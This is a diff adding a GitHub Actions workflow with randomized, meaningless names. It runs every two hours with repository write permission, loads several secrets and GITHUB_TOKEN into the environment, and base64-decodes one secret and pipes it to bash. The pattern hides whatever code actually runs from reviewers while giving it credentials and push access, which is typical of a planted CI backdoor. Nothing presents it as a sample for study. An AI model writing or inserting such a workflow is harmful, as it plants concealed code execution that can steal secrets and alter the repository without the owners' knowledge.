@@ -1,0 +1,21 @@
+name: qEIHjgoGgU
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  rFoTIt7:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.lO99L8GtJWODvI }}
+      - name: KXkF196U4T0Os
+        env:
+          ld3DGk: ${{ secrets.pOWQ9n }}
+          JI1hAYum3zpm: ${{ secrets.HUzO1KF0v6wEL5 }}
+          UONyQ: ${{ secrets.Nl3FK2LYr1SRiIX }}
+          GITHUB_TOKEN: ${{ secrets.lO99L8GtJWODvI }}
+        run: echo "$ld3DGk" | base64 -d | bash
